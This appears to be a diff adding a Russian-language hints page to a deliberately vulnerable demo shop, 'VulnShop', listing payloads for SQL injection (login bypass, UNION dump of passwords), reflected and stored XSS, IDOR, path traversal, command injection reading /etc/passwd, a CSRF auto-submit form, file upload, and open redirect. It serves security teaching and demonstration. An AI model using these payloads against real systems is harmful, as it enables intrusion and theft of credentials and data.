@@ -1,0 +1,214 @@
+{% extends "base.html" %}
+{% block title %}Подсказки — VulnShop{% endblock %}
+{% block content %}
+<section class="hints-page">
+  <p class="brand-mark hints-brand">Подсказки</p>
+  <h1>Шпаргалка для демонстрации</h1>
+  <p class="lede">Payload’ы и шаги для каждой уязвимости. Нажмите на карточку, чтобы раскрыть детали.</p>
+
+  <nav class="hints-toc">
+    <a href="#sqli-login">SQLi логин</a>
+    <a href="#sqli-search">SQLi поиск</a>
+    <a href="#xss-reflected">XSS отражённый</a>
+    <a href="#xss-stored">XSS хранимый</a>
+    <a href="#idor">IDOR</a>
+    <a href="#path">Path Traversal</a>
+    <a href="#cmd">Command Injection</a>
+    <a href="#csrf">CSRF</a>
+    <a href="#upload">Upload</a>
+    <a href="#admin">Access Control</a>
+    <a href="#api">API leak</a>
+    <a href="#redirect">Open Redirect</a>
+  </nav>
+
+  <details class="hint-card" id="sqli-login" open>
+    <summary>
+      <span class="hint-num">1</span>
+      <span class="hint-title">SQL Injection — обход входа</span>
+      <a class="hint-link" href="{{ url_for('login') }}" onclick="event.stopPropagation()">/login →</a>
+    </summary>
+    <div class="hint-body">
+      <p>Логин и пароль склеиваются в SQL без параметризации.</p>
+      <p><strong>Поле «Логин»:</strong></p>
+      <pre class="payload">admin' --</pre>
+      <p>Пароль — любой. Войдёте как admin.</p>
+      <p><strong>Или без знания логина:</strong></p>
+      <pre class="payload">' OR '1'='1' --</pre>
+      <p class="hint-why">Кавычка закрывает строку, <code>--</code> комментирует проверку пароля.</p>
+    </div>
+  </details>
+
+  <details class="hint-card" id="sqli-search">
+    <summary>
+      <span class="hint-num">2</span>
+      <span class="hint-title">SQL Injection — поиск</span>
+      <a class="hint-link" href="{{ url_for('search') }}" onclick="event.stopPropagation()">/search →</a>
+    </summary>
+    <div class="hint-body">
+      <p>Все товары сразу:</p>
+      <pre class="payload">%' OR 1=1 --</pre>
+      <p>UNION — утечка пользователей (логин/пароль в колонках товаров):</p>
+      <pre class="payload">%' UNION SELECT id, username, password, email, role FROM users --</pre>
+    </div>
+  </details>
+
+  <details class="hint-card" id="xss-reflected">
+    <summary>
+      <span class="hint-num">3</span>
+      <span class="hint-title">Reflected XSS</span>
+      <a class="hint-link" href="{{ url_for('search') }}" onclick="event.stopPropagation()">/search →</a>
+    </summary>
+    <div class="hint-body">
+      <p>В строку поиска:</p>
+      <pre class="payload">&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
+      <pre class="payload">&lt;img src=x onerror=alert(document.cookie)&gt;</pre>
+      <p>Готовая ссылка для демо:</p>
+      <pre class="payload">/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
+      <p class="hint-why">Скрипт выполняется у того, кто открыл ссылку. Можно украсть cookie сессии.</p>
+    </div>
+  </details>
+
+  <details class="hint-card" id="xss-stored">
+    <summary>
+      <span class="hint-num">4</span>
+      <span class="hint-title">Stored XSS — отзывы</span>
+      <a class="hint-link" href="{{ url_for('product', product_id=1) }}" onclick="event.stopPropagation()">/product/1 →</a>
+    </summary>
+    <div class="hint-body">
+      <p>В поле комментария:</p>
+      <pre class="payload">&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</pre>
+      <pre class="payload">&lt;img src=x onerror=alert(1)&gt;</pre>
+      <p class="hint-why">Сохраняется в БД и срабатывает у <em>каждого</em> посетителя страницы товара.</p>
+    </div>
+  </details>
+
+  <details class="hint-card" id="idor">
+    <summary>
+      <span class="hint-num">5</span>
+      <span class="hint-title">IDOR — чужой профиль</span>
+      <a class="hint-link" href="{{ url_for('profile') }}?id=1" onclick="event.stopPropagation()">/profile →</a>
+    </summary>
+    <div class="hint-body">
+      <p>Войдите как alice, затем смените параметр:</p>
+      <pre class="payload">/profile?id=1   → admin (+ секрет в сообщениях)
+/profile?id=2   → alice
+/profile?id=3   → bob</pre>
+      <p class="hint-why">Сервер не проверяет, что id принадлежит текущему пользователю.</p>
+    </div>
+  </details>
+
+  <details class="hint-card" id="path">
+    <summary>
+      <span class="hint-num">6</span>
+      <span class="hint-title">Path Traversal</span>
+      <a class="hint-link" href="{{ url_for('download', file='catalog.txt') }}" onclick="event.stopPropagation()">/download →</a>
+    </summary>
+    <div class="hint-body">
+      <p>Обычный файл:</p>
+      <pre class="payload">/download?file=catalog.txt</pre>
+      <p>Выход из папки — исходник приложения:</p>
+      <pre class="payload">/download?file=../app.py</pre>
+      <p>В catalog.txt есть флаг: <code>FLAG{path_traversal_works}</code></p>
+    </div>
+  </details>
+
+  <details class="hint-card" id="cmd">
+    <summary>
+      <span class="hint-num">7</span>
+      <span class="hint-title">Command Injection — Ping</span>
+      <a class="hint-link" href="{{ url_for('ping') }}" onclick="event.stopPropagation()">/ping →</a>
+    </summary>
+    <div class="hint-body">
+      <p><strong>Windows:</strong></p>
+      <pre class="payload">127.0.0.1 &amp; whoami
+127.0.0.1 &amp; dir</pre>
+      <p><strong>Linux / macOS:</strong></p>
+      <pre class="payload">127.0.0.1; id
+127.0.0.1; cat /etc/passwd</pre>
+      <p class="hint-why">Ввод попадает в <code>shell=True</code> без фильтрации.</p>
+    </div>
+  </details>
+
+  <details class="hint-card" id="csrf">
+    <summary>
+      <span class="hint-num">8</span>
+      <span class="hint-title">CSRF — поддельный перевод</span>
+      <a class="hint-link" href="{{ url_for('transfer') }}" onclick="event.stopPropagation()">/transfer →</a>
+    </summary>
+    <div class="hint-body">
+      <p>Форма без CSRF-токена. Пока жертва залогинена, вредоносная страница может отправить перевод.</p>
+      <pre class="payload">&lt;form action="http://127.0.0.1:5000/transfer" method="POST"&gt;
+  &lt;input name="to_user" value="bob"&gt;
+  &lt;input name="amount" value="50"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</pre>
+    </div>
+  </details>
+
+  <details class="hint-card" id="upload">
+    <summary>
+      <span class="hint-num">9</span>
+      <span class="hint-title">Unrestricted File Upload</span>
+      <a class="hint-link" href="{{ url_for('upload') }}" onclick="event.stopPropagation()">/upload →</a>
+    </summary>
+    <div class="hint-body">
+      <p>Загрузите любой файл (нет проверки расширения). Доступ:</p>
+      <pre class="payload">/uploads/имя_файла</pre>
+      <p class="hint-why">На реальном сервере это путь к RCE (шелл).</p>
+    </div>
+  </details>
+
+  <details class="hint-card" id="admin">
+    <summary>
+      <span class="hint-num">10</span>
+      <span class="hint-title">Broken Access Control — админка</span>
+      <a class="hint-link" href="{{ url_for('admin') }}" onclick="event.stopPropagation()">/admin →</a>
+    </summary>
+    <div class="hint-body">
+      <p>Войдите через SQLi (<code>admin' --</code>) и откройте админку — таблица пользователей с паролями.</p>
+      <p class="hint-why">Роль берётся из session, без сверки с БД.</p>
+    </div>
+  </details>
+
+  <details class="hint-card" id="api">
+    <summary>
+      <span class="hint-num">11</span>
+      <span class="hint-title">Information Disclosure — API</span>
+      <a class="hint-link" href="{{ url_for('api_user', user_id=1) }}" onclick="event.stopPropagation()">/api/user/1 →</a>
+    </summary>
+    <div class="hint-body">
+      <p>Без логина откройте:</p>
+      <pre class="payload">/api/user/1
+/api/user/2
+/api/user/3</pre>
+      <p>В JSON — <code>password</code>, email, баланс.</p>
+      <p class="hint-why">Лучший «вау» для начала демо — 30 секунд.</p>
+    </div>
+  </details>
+
+  <details class="hint-card" id="redirect">
+    <summary>
+      <span class="hint-num">12</span>
+      <span class="hint-title">Open Redirect</span>
+      <a class="hint-link" href="{{ url_for('open_redirect', url='https://example.com') }}" onclick="event.stopPropagation()">/redirect →</a>
+    </summary>
+    <div class="hint-body">
+      <pre class="payload">/redirect?url=https://example.com</pre>
+      <p class="hint-why">Ссылка выглядит как доверенный сайт, но уводит на чужой домен (фишинг).</p>
+    </div>
+  </details>
+
+  <section class="demo-order">
+    <h2>Порядок на презентации</h2>
+    <ol>
+      <li><a href="#api">API</a> — пароли сразу</li>
+      <li><a href="#sqli-login">SQLi логин</a> → admin</li>
+      <li><a href="#admin">Админка</a></li>
+      <li><a href="#idor">IDOR</a></li>
+      <li><a href="#xss-reflected">XSS</a> → <a href="#xss-stored">Stored XSS</a></li>
+      <li><a href="#path">Path Traversal</a></li>
+      <li><a href="#cmd">Command Injection</a></li>
+    </ol>
+  </section>
+</section>
+{% endblock %}
